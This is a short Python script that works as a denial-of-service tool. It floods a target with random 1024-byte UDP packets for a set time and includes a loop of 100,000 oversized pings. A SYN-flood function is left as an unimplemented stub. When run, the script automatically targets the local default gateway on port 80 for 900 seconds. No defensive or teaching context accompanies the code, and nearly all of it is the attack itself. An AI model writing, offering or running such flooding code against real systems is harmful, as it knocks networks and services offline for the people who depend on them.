import os
import sys
import netifaces
import random
import platform
import sys
import socket
import time


def DOS(IP, port, times):
    if platform.system()[:3].lower()=="win":
        os.system("cls")
    else:
        os.system("clear")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeoutValue = time.time() + times

    c = 0  # num of packets

    while True:
        try:
            if time.time() > timeoutValue:
                break
            sock.sendto(bytes, (IP, port))
            c += 1
            print("sent " + str(c) + " packets to " + IP + " through port " + str(port))
        except KeyboardInterrupt:
            quit()


def getGateway():
    default_gateway=netifaces.gateways()
    # print(default_gateway)
    return default_gateway.get("default").get(2)[0]

def pingDataOverload(IP):
    for i in range(100000):
        os.system("ping "+IP+" 65500 -w 1 -n 1")

def synFlood(IP, port, numPackets): #implement later
	pass



# print(getGateway())
# pingDataOverload(getGateway())
DOS(getGateway(), 80, 900)